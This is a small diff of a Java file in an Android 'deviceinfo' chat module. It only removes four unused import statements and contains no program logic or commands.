@@ -1,6 +1,5 @@
 package com.android.deviceinfo.module.chat;
 
-import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
@@ -14,9 +13,7 @@ import org.json.JSONObject;
 import org.json.JSONTokener;
 
 import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordHashPairVisitor;
@@ -24,7 +21,6 @@ import com.android.deviceinfo.db.RecordHashtableIdVisitor;
 import com.android.deviceinfo.db.RecordListVisitor;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
-import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
